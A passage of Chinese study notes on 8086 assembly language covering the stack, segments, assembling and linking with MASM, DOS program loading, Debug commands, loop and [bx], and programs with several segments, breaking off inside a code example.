<p>前面我们已经学习了CS和DS两个段寄存器。并且知道CS:IP指向的内存单元被当做指令，DS:[address]指向的内存单元被当做数据。这里我们引入另外一个段寄存器SS，SS中保存的是栈顶元素的段地址，此外使用SP保存栈顶元素的偏移地址。故在任意时刻SS:SP都指向栈顶元素。</p>
<p>PUSH AX的操作详情：<br>（1）SP&#x3D;SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶；<br>（2）将ax中的内容送入SS:SP指向的内存单元，SS:SP此时指向新的栈顶。</p>
<p>POP AX的操作详情：<br>（1）将SS:SP指向的内存单元处的数据送入ax中；<br>（2）SP&#x3D;SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</p>
<h3 id="3-8-栈顶超界问题"><a href="#3-8-栈顶超界问题" class="headerlink" title="3.8 栈顶超界问题"></a><strong>3.8 栈顶超界问题</strong></h3><p>当栈满的时候进行PUSH操作或者栈空的时候使用POP操作，都将引发栈顶超界问题。</p>
<p>8086CPU并未对栈顶超界做任何处理，程序员在编程的时候应当避免使得栈顶超界的情况发生。</p>
<h3 id="3-9-push、pop指令"><a href="#3-9-push、pop指令" class="headerlink" title="3.9 push、pop指令"></a><strong>3.9 push、pop指令</strong></h3><p>push指令和pop指令支持如下形式：  </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 寄存器</span><br><span class="line">push 段寄存器</span><br><span class="line">push 内存单元</span><br><span class="line"></span><br><span class="line">pop 寄存器</span><br><span class="line">pop 段寄存器</span><br><span class="line">pop 内存单元</span><br></pre></td></tr></table></figure></div>
<p>push、pop实际上就是一种内存传送指令，可以在寄存器和内存之间传送数据，与mov指令不同的是，push和pop指令访问的内存单元的地址不是在指令中给出的，而是由SS:SP指出的。同时，push和pop还要改变sp中的值。CPU执行mov指令仅需一步，CPU执行push和pop指令需要两步：传送数据和修改sp的值。</p>
<p>需要注意的是，push、pop等栈操作指令，修改的只是SP，也就是说，栈顶的变化范围最大为：0~FFFFH。</p>
<blockquote>
<p><strong>栈的综述</strong><br>（1）8086CPU提供了栈操作机制，方案如下。<br>在SS、SP中存放栈顶的段地址和偏移地址；<br>提供入栈和出栈指令，它们根据SS:SP指示的地址，按照栈的方式访问内存单元。<br>（2）push指令的执行步骤：1、 SP&#x3D;SP-2； 2、向SS:SP指向的字单元中送入数据。<br>（3）pop指令的执行步骤：1、从SS:SP指向的字单元中读取数据；2、SP&#x3D;SP+2。<br>（4）任意时刻，SS:SP指向栈顶元素。<br>（5）8086CPU只记录栈顶，栈空间的大小我们要自己管理。<br>（6）用栈来暂存以后要恢复的寄存器的内容时，寄存器出栈的顺序要和入栈的顺序相反。<br>（7）push、pop实际上是一种内存传送指令，注意它们的灵活应用。<br>栈是一种非常重要的机制，一定要深入理解，灵活掌握。  (P67)</p>
</blockquote>
<h3 id="3-10-栈段"><a href="#3-10-栈段" class="headerlink" title="3.10 栈段"></a><strong>3.10 栈段</strong></h3><p>与代码段、数据段类似，我们在编程时，可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N(N&lt;&#x3D;64KB)的一组地址连续、起始地址为16的倍数的内存单元，当做栈空间来用。只需要使用SS:SP指向它们。</p>
<p>一个栈最大为64KB，即偏移地址所能指向的最大范围。当一个大小为64KB的栈，其SP&#x3D;0时则表示该栈为空或者栈满。</p>
<blockquote>
<p><strong>段的综述</strong><br>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元（通过偏移地址的移动来访问段内的单元）。这完全是我们自己的安排。</p>
<p>我们可以用一个段存放数据，将它定义为“数据段”；<br>我们可以用一个段存放代码，将它定义为“代码段”；<br>我们可以用一个段当做栈，将它定义为“栈段”；  </p>
<p>我们可以这样安排，但若要让CPU按照我们的安排来访问这些段，就要：</p>
<p>对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当做数据来访问；  </p>
</blockquote>
<p>对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码段中的指令；  对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当做栈空间来用。</p>
<blockquote>
<p>可见，不管我们如何安排，CPU将内存中的某段内容当做代码，是因为CS:IP指向了那里；CPU将某段内存当做栈，是因为SS:SP指向了那里。我们一定要清楚，什么是我们的安排，以及如何让CPU按我们的安排行事。要非常清楚CPU的工作原理，才能在控制CPU按照我们安排运行的时候做到游刃有余。</p>
<p>比如我们将10000H~1001FH安排为代码段，并在里面存储如下代码：</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 1000H   </span><br><span class="line">mov ss, ax  </span><br><span class="line">mov sp, 0020H         ;初始化栈顶  </span><br><span class="line">mov ax, cs  </span><br><span class="line">mov ds, ax            ;设置数据段段地址  </span><br><span class="line">mov ax, [0]</span><br><span class="line">add ax, [2]</span><br><span class="line">mov bx, [4]</span><br><span class="line">add bx, [6]</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>设置CS&#x3D;1000H，IP&#x3D;0，这段代码将得到执行。可以看到，在这段代码中，我们又将10000H<del>1001FH安排为栈段和数据段。10000H</del>1001FH这段内存，即是代码段，又是栈段和数据段。</p>
<p>一段内存，可以即是代码的存储空间，又是数据的存储空间，还可以是栈空间，也可以什么也不是。关键在于CPU中寄存器的设置，即CS、IP，SS、SP，DS的指向。</p>
<p>（p69）</p>
</blockquote>
<hr>
<h2 id="第四章-第一个程序"><a href="#第四章-第一个程序" class="headerlink" title="第四章 第一个程序"></a><strong>第四章 第一个程序</strong></h2><h3 id="4-1-一个源程序从写出到执行的过程"><a href="#4-1-一个源程序从写出到执行的过程" class="headerlink" title="4.1 一个源程序从写出到执行的过程"></a><strong>4.1 一个源程序从写出到执行的过程</strong></h3><p>一个汇编语言程序从写出到最终执行主要经历三步：  </p>
<p>第一步：编写汇编语言程序；<br>第二步：对源程序进行编译连接；<br>第三步：执行可执行文件中的程序。</p>
<p>对源程序进行编译连接生成可在操作系统中直接运行的可执行文件。可执行文件包含两部分内容。</p>
<ul>
<li>程序（从源程序中的汇编指令翻译过来的机器码）和数据（源程序中定义的数据）</li>
<li>相关的描述信息（比如，程序有多大、要占用多少内存空间等）</li>
</ul>
<h3 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2 源程序"></a><strong>4.2 源程序</strong></h3><p>一段简单的汇编语言源程序：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    mov ax, <span class="number">0123</span>H</span><br><span class="line">    mov bx, <span class="number">0456</span>H</span><br><span class="line">    add ax, bx</span><br><span class="line">    add ax, ax</span><br><span class="line"></span><br><span class="line">    mov ax, <span class="number">4</span>c00H</span><br><span class="line">    <span class="type">int</span> <span class="number">21</span>H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>
<h4 id="1-伪指令"><a href="#1-伪指令" class="headerlink" title="1. 伪指令"></a><strong>1. 伪指令</strong></h4><p>在汇编语言源程序中，包括两种指令，一种是汇编指令，一种是伪指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。而伪指令没有对应的机器指令，最终不被CPU所执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相应的编译工作。   </p>
<p>下面介绍上面程序中所出现的几个伪指令：</p>
<p>**（1） segment和ends **</p>
<p>segment和ends是一对成对使用的伪指令。功能是定义一个段。使用格式为：  </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">段名 segment</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">段名 ends</span><br></pre></td></tr></table></figure></div>
<p>一个汇编语言程序是由多个段组成的，这些段被用来存放代码（代码段）、数据（数据段）或当做栈空间（栈段）来使用。</p>
<p>**（2）end  **</p>
<p>end是一个汇编语言的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。</p>
<p>**（3）assume **  </p>
<p>这条伪指令的含义为“假设”。它假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。即将定义的段的段地址存放在段寄存器中。</p>
<h4 id="2-源程序中的“程序”"><a href="#2-源程序中的“程序”" class="headerlink" title="2. 源程序中的“程序”"></a><strong>2. 源程序中的“程序”</strong></h4><p>我们将源程序文件中的所有的内容称之为源程序，将源程序中最终由计算机执行、处理的指令或数据，称为程序。  </p>
<h4 id="3-标号"><a href="#3-标号" class="headerlink" title="3. 标号"></a><strong>3. 标号</strong></h4><p>汇编源程序中，除了汇编指令和伪指令外，还有一些标号，比如“codesg”。<strong>一个标号指代了一个地址</strong>。比如codesg在segment的前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</p>
<h4 id="4-程序的结构"><a href="#4-程序的结构" class="headerlink" title="4. 程序的结构"></a><strong>4. 程序的结构</strong></h4><p>源程序就是由一些段组成的。我们可以在这些段中存放代码、数据、或将某个段当做栈空间。</p>
<h4 id="5-程序返回"><a href="#5-程序返回" class="headerlink" title="5. 程序返回"></a><strong>5. 程序返回</strong></h4><p>一个程序结束后，将CPU控制权交还给使它得以运行的程序，我们称这个过程为<strong>程序返回</strong>。  程序返回指令：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, <span class="number">4</span>c00H</span><br><span class="line"><span class="type">int</span> <span class="number">21</span>H</span><br></pre></td></tr></table></figure></div>
<p>当前我们不必理解这两天语句的含义。只要记住使用这两条指令可以实现程序返回。</p>
<p><strong>段结束、程序结束、程序返回的区别</strong>  </p>
<table>
<thead>
<tr>
<th>目的</th>
<th>相关指令</th>
<th>指令性质</th>
<th>指令执行者</th>
</tr>
</thead>
<tbody><tr>
<td>通知编译器一个段结束</td>
<td>段名 ends</td>
<td>伪指令</td>
<td>编译时，由编译器执行</td>
</tr>
<tr>
<td>通知编译器程序结束</td>
<td>end</td>
<td>伪指令</td>
<td>编译时，由编译器执行</td>
</tr>
<tr>
<td>程序返回</td>
<td>mov ax,4c00H int 21H</td>
<td>汇编指令</td>
<td>执行时，由于CPU执行</td>
</tr>
</tbody></table>
<h4 id="6-语法错误和逻辑错误"><a href="#6-语法错误和逻辑错误" class="headerlink" title="6. 语法错误和逻辑错误"></a><strong>6. 语法错误和逻辑错误</strong></h4><p>一般来说，程序在编译时被编译器发现的错误是语法错误，如 mov ss, 1234 。</p>
<p>在程序编译后，在运行时发生的错误是逻辑错误，如除零操作。</p>
<h3 id="4-3-编辑源程序"><a href="#4-3-编辑源程序" class="headerlink" title="4.3 编辑源程序"></a><strong>4.3 编辑源程序</strong></h3><p>源程序文件以.asm作为后缀。</p>
<h3 id="4-4-编译"><a href="#4-4-编译" class="headerlink" title="4.4 编译"></a><strong>4.4 编译</strong></h3><p>我们使用微软的masm5.0汇编编译器进行编译，文件名为masm.exe。我们以c:\1.asm为例说明编译源程序的方法步骤。  </p>
<p>（1）进入DOS方式，运行masm.exe。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">Source filename [.ASM]: _</span><br></pre></td></tr></table></figure></div>

<p>（2）输入要编译的源程序文件名，按enter键。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Source filename [.ASM]: c:\1.asm</span><br><span class="line">Object filename [1.obj]:</span><br></pre></td></tr></table></figure></div>
<p>输入要编译出的目标文件名，如果不输入则默认使用源程序名。</p>
<p>（3）确定了目标文件名称后，继续按Enter键（两次），忽略中间文件的生成。  </p>
<p>最终完成对源程序的编译，生成目标文件。目标文件以.obj作为后缀。</p>
<h3 id="4-5-连接"><a href="#4-5-连接" class="headerlink" title="4.5 连接"></a><strong>4.5 连接</strong></h3><p>在对源程序进行编译生成目标文件后，我们需要对目标文件进行连接，从而得到可执行文件。  </p>
<p>这里我们使用微软的Overlay Linker3.60连接器，文件名为link.exe。我们以4.4中生成的目标文件c:\masm\1.obj为例说明连接操作步骤。</p>
<p>（1）进入DOS方式，运行link.exe。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">Object Modules [.OBJ]: _</span><br></pre></td></tr></table></figure></div>

<p>（2）输入目标文件名，按enter键。  </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">Object Modules [.OBJ]: 1.obj</span><br><span class="line">Run File [1.EXE]: _</span><br></pre></td></tr></table></figure></div>
<p>键入生成可执行文件的名称。如果不输入则默认使用源程序名。</p>
<p>（3）确定了可执行文件名后，按Enter键（两次），忽略镜像文件的生成，忽略库文件的连接。</p>
<p>经过以上三步后，最终会生成以.exe结尾的可执行文件。</p>
<p><strong>连接的作用</strong>  </p>
<p>（1）当源程序很大时，可以将它分为多个源程序文件来单独编译，然后将生成的目标文件连接在一起，节约程序编译时间。</p>
<p>（2）程序中调用了某个库文件的子程序，需要将这个库文件和该程序生成的目标文件连接在一起，生成一个可执行文件。</p>
<p>（3）一个源程序编译后，达到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这些内容处理为最终的可执行信息。所以，在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行<br>文件。</p>
<h3 id="4-6-以简化的方式进行编译和连接"><a href="#4-6-以简化的方式进行编译和连接" class="headerlink" title="4.6 以简化的方式进行编译和连接"></a><strong>4.6 以简化的方式进行编译和连接</strong></h3><p>一键编译：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">masm c:\1.asm;</span><br></pre></td></tr></table></figure></div>

<p>一键连接：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">link c:\1.obj;</span><br></pre></td></tr></table></figure></div>

<h3 id="4-7-1-exe的执行"><a href="#4-7-1-exe的执行" class="headerlink" title="4.7 1.exe的执行"></a><strong>4.7 1.exe的执行</strong></h3><p>进入dos环境，直接键入.exe可执行文件的文件名即可执行。</p>
<h3 id="4-8-谁将可执行文件中的程序装载进入内存并使它运行"><a href="#4-8-谁将可执行文件中的程序装载进入内存并使它运行" class="headerlink" title="4.8 谁将可执行文件中的程序装载进入内存并使它运行"></a><strong>4.8 谁将可执行文件中的程序装载进入内存并使它运行</strong></h3><p>（1）在DOS中直接执行1.exe时，是正在运行的command，将1.exe中的程序加载入内存；  </p>
<p>（2）command设置CPU的CS:IP指向程序的第一条指令（即程序入口），从而使程序得以运行。</p>
<p>（3）程序运行结束后，返回到command中，CPU继续运行command。</p>
<blockquote>
<p><strong>操作系统的外壳</strong></p>
<p>操作系统是由多个功能模块组成的庞大、复杂的软件系统。任何通用的操作系统，都要提供一个称为shell(外壳)的程序，用户（操作人员）使用这个程序来操作计算机系统进行工作。</p>
<p>DOS中有一个程序command.exe，这个程序在DOS中称为命令解释器，也就是DOS系统的shell。</p>
<p>DOS启动时，先完成其他重要的初始化工作，然后运行command.exe，command.exe运行后，执行完其他的相关任务后，在屏幕上显示出由当前盘符和当前路径组成的提示符，比如：“c:\”或“c:\windows”等，然后等待用户的输入。</p>
<p>用户可以输入要执行的命令，比如，cd、dir、type等，这些命令由于command执行，command执行完这些命令后，再次显示当前盘符和当前路径组成的提示符，等待用户输入。</p>
<p>如果用户要执行一个程序，则输入该程序可执行文件的名称，command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载入内存，设置CS:IP指向程序的入口。此后，command暂停运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示由当前盘符和当前路径组成的提示符，等待用户输入。</p>
<p>在DOS中，command处理各种输入：命令或要执行的程序的文件名。我们就是通过command来进行工作的。</p>
</blockquote>
<p><strong>shell : 操作人员和OS之间的API。</strong></p>
<blockquote>
<p><strong>汇编程序从写出到执行的过程</strong></p>
<p>到此，完成了一个汇编程序从写出到执行的全部过程。我们经历了这样一个历程：  编程（Edit） →  1.asm → 编译（masm） → 1.obj → 连接（link） → 1.exe → 加载（command） → 内存中的程序 → 运行（CPU）</p>
</blockquote>
<h3 id="4-9-程序执行过程的跟踪"><a href="#4-9-程序执行过程的跟踪" class="headerlink" title="4.9 程序执行过程的跟踪"></a><strong>4.9 程序执行过程的跟踪</strong></h3><p><strong>DOS系统中.exe文件中程序的加载过程</strong>  </p>
<p>（1）找到一段起始地址为SA:0000（即起始地址的偏移地址为0）的容量足够的空闲内存区；</p>
<p>（2）在这段内存区的前256个字节中，创建一个称为程序段前缀（PSP）的数据区，DOS要利用PSP来和被加载程序进行通信；</p>
<p>（3）从这段内存区的256字节处开始（在PSP后面），将程序装入，程序的地址被设为SA+10H:0；（空闲内存区从SA:0开始，0~255字节为PSP，从256字节处开始存放程序，为了更好地区分PSP和程序，DOS一般将它们划分到不同的段中，所以有了这样的地址安排：<br>空闲内存区：SA:00<br>PSP区：SA:0<br>程序区：SA+10:0<br>注意：PSP和程序区虽然物理地址连续，却有着不同的段地址<br>）  </p>
<p>（4）将该内存区的段地址存取ds中，初始化其它相关寄存器后，设置CS:IP指向程序入口。</p>
<p>程序加载进内存后，cx中存放的是程序的长度，ds存放着程序所在内存区的段地址，cs存放可执行程序的段地址，ip存放着可执行程序的偏移地址。</p>
<p><strong>Debug常用命令</strong>  </p>
<p>我们使用Debug对程序的执行过程进行跟踪。<br>用T命令单步执行程序的每一条执行。<br>用P命令执行程序结束语句int 21。<br>用Q命令退出debug。</p>
<hr>
<h2 id="第五章-BX-和loop指令"><a href="#第五章-BX-和loop指令" class="headerlink" title="第五章  [BX]和loop指令"></a><strong>第五章  [BX]和loop指令</strong></h2><p><strong>1. [bx]和内存单元的描述</strong>  </p>
<p>[bx]表示一个<strong>内存单元</strong>，该内存单元的段地址位于ds中，偏移地址位于bx中。<br>该内存单元的完整地址为： ds*16 + bx。</p>
<p><strong>2. loop</strong></p>
<p>循环指令。指令格式为：loop 标号<br>该指令分两步执行。  </p>
<p>第一步，计算 cx &#x3D; cx -1<br>第二步，判断cx中的值，不为零则跳转至标号出执行程序，如果为零则向下执行。</p>
<p><strong>3. 我们定义的描述性的符号：“（）”</strong></p>
<p>“（）”表示一个内存单元或寄存器的内容。也即是存储器中存储的值。</p>
<p>“（）”中的元素可以有3中类型：寄存器名、段寄存器名、内存单元的物理地址（一个20位数据）。</p>
<p><strong>4. 约定符号idata表示常量</strong></p>
<p>在以后的学习中我们约定idata表示一个常量。</p>
<h3 id="5-1-BX"><a href="#5-1-BX" class="headerlink" title="5.1 [BX]"></a><strong>5.1 [BX]</strong></h3><p>[bx]表示一个<strong>内存单元。</strong></p>
<p>mov ax, [bx] 代码的含义：将ds:bx所指向内存单元的内容放入ax寄存器中。即：(ax)&#x3D;((ds*16)+(bx))</p>
<p>mov [bx], ax 代码的含义：将ax中的内容放入ds:bx所指向的内存单元中。即：((ds*16)+(bx))&#x3D;(ax)</p>
<h3 id="5-2-Loop指令"><a href="#5-2-Loop指令" class="headerlink" title="5.2 Loop指令"></a><strong>5.2 Loop指令</strong></h3><p>首先loop指令的格式是：loop 标号。该指令分两步执行：</p>
<p>第一步， 计算cx &#x3D; cx - 1；<br>第二步，判断cx中的值，不为零则跳转至标号处执行程序，如果为零则向下执行。</p>
<p>一般使用loop指令实现循环功能。格式如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    mov cx, n</span><br><span class="line">s:  add ax, ax</span><br><span class="line">    loop s</span><br></pre></td></tr></table></figure></div>
<p>以上代码会循环执行n次。（n &gt;&#x3D; 0）</p>
<h3 id="5-3-在Debug中跟踪用loop指令实现的循环程序"><a href="#5-3-在Debug中跟踪用loop指令实现的循环程序" class="headerlink" title="5.3 在Debug中跟踪用loop指令实现的循环程序"></a><strong>5.3 在Debug中跟踪用loop指令实现的循环程序</strong></h3><p>使用Debug调试程序时，有几条经常用到的指令。</p>
<p><strong>T指令</strong>，单步执行指令。</p>
<p><strong>g指令</strong>, 跳至断点，从当前IP执行至指定IP处。”g 0012”表示程序由当前位置执行至DS:0012处。</p>
<p><strong>p指令</strong>，循环执行指令，p指令用于执行完当前次数。</p>
<h3 id="5-4-Debug和汇编编译器masm对指令的不同处理"><a href="#5-4-Debug和汇编编译器masm对指令的不同处理" class="headerlink" title="5.4 Debug和汇编编译器masm对指令的不同处理"></a><strong>5.4 Debug和汇编编译器masm对指令的不同处理</strong></h3><p>Debug和汇编编译器masm对形如“mov ax, [0]”这类指令的处理是不同的。debug将”[0]”看做是一个内存单元，该内存单元的地址是 ds*6 + 0。而编译器直接将“[0]”看做立即数0。因此有如下约定。</p>
<p>（1）在汇编源程序中，如果指令访问一个内存单元，则在指令中必须用”[…]”来表示内存单元，如果在“[…]”里用一个常量idata直接给出内存单元的偏移地址，就要在“[]”的前面显式的给出段地址所在的段寄存器。</p>
<p>（2）如果在“[]”里面用寄存器，比如bx,间接给出内存单元的偏移地址，则段地址默认在ds中。当然，也可以显式的给出段地址所在的段寄存器。</p>
<p>以上两点概括来说就是，如果内存单元的偏移地址使用立即数给出，则必须显式指明其段地址所在的段寄存器。</p>
<h3 id="5-5-loop和-bx-的联合应用"><a href="#5-5-loop和-bx-的联合应用" class="headerlink" title="5.5 loop和[bx]的联合应用"></a><strong>5.5 loop和[bx]的联合应用</strong></h3><p>通过loop和[bx]联合应用实现对连续内存单元的操作实例：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    ...</span><br><span class="line">    mov bx, <span class="number">0</span></span><br><span class="line">    mov cx, <span class="number">50</span></span><br><span class="line"></span><br><span class="line">s:  mov ax, [bx]</span><br><span class="line">    inc bx</span><br><span class="line">    loop s</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>
<p>以上代码通过循环实现了对内存单元DS:0000H~DS:0032H内容的操作。</p>
<h3 id="5-6段前缀"><a href="#5-6段前缀" class="headerlink" title="5.6段前缀"></a><strong>5.6段前缀</strong></h3><p>如果内存单元的偏移地址由bx给出，如“mov ax, [bx]”，则段地址默认位于ds中。我们也可以在访问内存单元的指令中显式的给出内存单元段地址所在的段寄存器。比如：</p>
<p>（1）mov ax, ds:[bx]<br>（2）mov ax, cs:[bx]<br>（3）mov ax, ss:[bx]<br>（4）mov ax, cs:[bx]<br>（5）mov ax, ss:[0]<br>（6）mov ax, cs:[0]</p>
<p>这些出现在访问内存单元的指令中，用于显式的指明内存单元的段地址的“ds:”、“cs:”、“ss:”、“es:”，在汇编语言中称为<strong>段前缀</strong>。</p>
<h3 id="5-7-一段安全的空间"><a href="#5-7-一段安全的空间" class="headerlink" title="5.7 一段安全的空间"></a><strong>5.7 一段安全的空间</strong></h3><p>（1）我们需要直接向一段内存汇总写入内容；</p>
<p>（2）这段内存空间不应当存放系统或其他程序的数据或代码，否则写入操作很可能引发错误；</p>
<p>（3）DOS方式下，一般情况，0:200~0:2ff空间中没有系统或其他程序的数据或代码；</p>
<p>（4）以后，我们需要直接向一段内存中写入内容时，就使用0:200~0:2ff这段空间。</p>
<h3 id="5-8-段前缀的使用"><a href="#5-8-段前缀的使用" class="headerlink" title="5.8 段前缀的使用"></a><strong>5.8 段前缀的使用</strong></h3><p>当需要操作的内存空间跨段时，显式的使用段前缀给出内存单元的段地址，可以避免在循环中对ds的重复设置。</p>
<p>也即是说一个内存单元的段地址不仅仅可以由ds给出，也可以通过cs、ss、es给出。</p>
<hr>
<h2 id="第六章-包含多个段的程序"><a href="#第六章-包含多个段的程序" class="headerlink" title="第六章 包含多个段的程序"></a><strong>第六章 包含多个段的程序</strong></h2><p>程序取得所需空间的方法有两种，一是在加载程序的时候为程序分配，再就是程序在执行的过程向系统分配。在本课程中，我们只讨论第一种方法。</p>
<h3 id="6-1-在代码段中使用数据"><a href="#6-1-在代码段中使用数据" class="headerlink" title="6.1 在代码段中使用数据"></a><strong>6.1 在代码段中使用数据</strong></h3><p>下面一段代码用于计算8个数据的累加和，结果放在ax寄存器中：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">  dw <span class="number">0123</span>h, <span class="number">0456</span>h, <span class="number">0789</span>h, <span class="number">0</span>abch, <span class="number">0</span>defh, <span class="number">0f</span>edh, <span class="number">0</span>cbah, <span class="number">0987</span>h</span><br><span class="line"></span><br><span class="line">start mov bx, <span class="number">0</span></span><br><span class="line">      mov ax, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">      mov cx, <span class="number">8</span></span><br><span class="line">  s:  add ax, cs:[bx]</span><br><span class="line">      add bx, <span class="number">2</span></span><br><span class="line">      loop s</span><br><span class="line"></span><br><span class="line">  mov ax, <span class="number">4</span>c00H</span><br><span class="line">  <span class="type">int</span> <span class="number">21</span>H</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>
<p>分析这段代码，我们使用dw定义了8个字型数据，并且使用 “end 标号”的形式指明了程序的入口。</p>
<h3 id="6-2-在代码段中使用栈"><a href="#6-2-在代码段中使用栈" class="headerlink" title="6.2 在代码段中使用栈"></a><strong>6.2 在代码段中使用栈</strong></h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    dw <span class="number">0123</span>h,<span class="number">0456</span>h,<span class="number">0789</span>h,<span class="number">0</span>abch,<span class="number">0</span>defh,<span class="number">0f</span>edh,<span class="number">0</span>cbah,<span class="number">0987</span>h</span><br><span class="line">    dw <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">start:  mov ax, cs</span><br><span class="line">        mov ss, ax</span><br><span class="line">        mov sp, <span class="number">30</span>h</span><br><span class="line"></span><br><span class="line">        mov bx, <span class="number">0</span></span><br><span class="line">        mov cx, <span class="number">8</span></span><br><span class="line">    s:  push cs:[bx]</span><br><span class="line">        add bx, <span class="number">2</span></span><br><span class="line">        loop s</span><br><span class="line"></span><br><span class="line">        mov bx, <span class="number">0</span></span><br><span class="line">        mov cx, <span class="number">8</span></span><br><span class="line">    s0: pop cs:[bx]</span><br><span class="line">        add bx, <span class="number">2</span></span><br><span class="line">        loop s0</span><br><span class="line"></span><br><span class="line">    mov ax, <span class="number">4</span>c00h</span><br><span class="line">    <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>

<h3 id="6-3-将数据、代码、栈放入不同的段"><a href="#6-3-将数据、代码、栈放入不同的段" class="headerlink" title="6.3 将数据、代码、栈放入不同的段"></a><strong>6.3 将数据、代码、栈放入不同的段</strong></h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:code, ds:data, ss:<span class="built_in">stack</span></span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">  dw <span class="number">0123</span>h,<span class="number">0456</span>h,<span class="number">0789</span>h,<span class="number">0</span>abch,<span class="number">0</span>defh,<span class="number">0f</span>edh,<span class="number">0</span>cbah,<span class="number">0987</span>h</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span> segment</span><br><span class="line">  dw <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">stack</span> ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:  mov ax, <span class="built_in">stack</span></span><br><span class="line">        mov ss, ax</span><br><span class="line">        mov sp, <span class="number">20</span>h</span><br><span class="line"></span><br><span class="line">        mov ax, data</span><br><span class="line">        mov ds, ax</span><br><span class="line"></span><br><span class="line">        mov bx, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        mov cx, <span class="number">8</span></span><br><span class="line">    s:  push [bx]</span><br><span class="line">        add bx, <span class="number">2</span></span><br><span class="line">        loop s</span><br><span class="line"></span><br><span class="line">        mov bx, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        mov cx, <span class="number">8</span></span><br><span class="line">   s0:  pop [bx]</span><br><span class="line">        add bx, <span class="number">2</span></span><br><span class="line">        loop s0</span><br><span class="line"></span><br><span class="line">      mov 